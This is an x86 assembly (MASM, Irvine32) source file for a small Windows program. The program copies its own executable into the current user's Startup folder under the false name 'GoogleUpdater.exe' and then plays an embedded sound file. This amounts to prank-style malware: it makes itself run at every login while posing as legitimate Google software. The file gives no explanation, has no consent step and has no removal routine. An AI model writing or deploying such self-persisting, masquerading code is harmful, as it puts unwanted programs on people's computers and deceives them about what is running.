
	includelib Winmm.lib
	includelib kernel32.lib
	include Irvine32.inc


PlaySound PROTO,
        pszSound:PTR BYTE, 
        hmod:DWORD, 
        fdwSound:DWORD

GetModuleHandleA PROTO,
	psModuleName: PTR BYTE

GetUserNameA PROTO,
	targetString: PTR BYTE,
	intBuffer: PTR DWORD

GetModuleFileNameA PROTO,
	putZeroHere: DWORD,
	targetSTring: PTR Byte,
	intBuffer: DWORD

CopyFileA PROTO,
	source: PTR BYTE,
	destination: PTR BYTE,
	MakeMe1: DWORD

Str_compare PROTO,
	string1:PTR BYTE,
	string2:PTR BYTE

DeleteFileA PROTO,
	source: PTR BYTE




.data
IDR_WAVE1 equ 101
SND_RESOURCE DWORD 00040004h
SND_ASYNC DWORD 0001h
SND_RES_AND_ASYNC DWORD 40004h

userName BYTE 50 DUP(?)
finalCOmmand BYTE 800 DUP (0)
secondCOmmand BYTE 800 DUP (0)
beginningOfStartup BYTE "C:\Users\",0
endOfStartup BYTE '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GoogleUpdater.exe',0
filePath BYTE 200 DUP(0)
userBuffer DWORD 50



hmod DWORD 0000h


file BYTE "IDR_WAVE1",0



.code

strcat PROC USES eax ecx esi edi,
	target:PTR BYTE, ; source string
	source:PTR BYTE ; target string

	INVOKE Str_length, target ;Get String Length
	mov edi, target
	add edi, eax
	mov target, edi
	INVOKE Str_length,source ; EAX = length source
	
	mov ecx,eax ; REP count
	inc ecx ; add 1 for null byte
	mov esi,source
	mov edi,target
	cld 
	rep movsb 
	ret

strcat ENDP
main PROC

	 INVOKE GetModuleFileNameA, 0, ADDR filePath, 200 ;Get name of current file
	 INVOKE strcat, ADDR  finalCommand , ADDR filePath ;
	 INVOKE strcat, ADDR SecondCommand, ADDR beginningOfStartup
	 INVOKE GetUsernameA, ADDR userName,ADDR userBuffer
	 INVOKE strcat, ADDR SecondCommand, ADDR userName
	 INVOKE strcat, ADDR SecondCOmmand, ADDR endOfStartup

	 INVOKE CopyFileA, ADDR finalCommand, ADDR SecondCOmmand, 1 ;Copy .exe to Startup Directory
	
	 INVOKE GetModuleHandleA, 00 ;Fetch the current module, so we can pass to PlaySound
	 mov hmod, eax
	 INVOKE PlaySound, IDR_WAVE1, hmod, SND_RES_AND_ASYNC ;Play the Music File stored in resources
	 


main ENDP

END main